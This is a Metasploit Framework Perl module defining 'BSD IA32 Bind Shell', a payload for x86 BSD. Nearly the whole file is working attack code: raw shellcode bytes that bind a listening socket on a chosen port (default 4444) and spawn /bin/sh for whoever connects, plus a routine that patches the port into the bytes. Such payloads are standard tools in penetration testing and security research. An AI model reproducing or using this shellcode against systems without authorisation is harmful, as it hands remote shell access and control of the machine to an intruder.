
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
  'Name'         => 'BSD IA32 Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', 
                      'skape <mmiller [at] hick.org>'],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	my $self = $class->SUPER::new($hash, @_);

	$self->_Info->{'Size'} = $self->_GenSize;
	return($self);
}

sub Build 
{
	my $self = shift;
	return($self->Generate($self->GetVar('LPORT')));
}

sub Generate {
	my $self = shift;
	my $port = shift;
	my $off_port = 0x8;
	my $port_bin = pack('n', $port);

	my $shellcode =
		"\x6a\x61\x58\x99\x52\x68\x10\x02\xbf\xbf\x89\xe1\x52\x42\x52\x42" .
		"\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" .
		"\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a" .
		"\x58\x51\x57\x51\xcd\x80\x49\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68" .
		"\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";

	substr($shellcode, $off_port, 2, $port_bin);

	return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
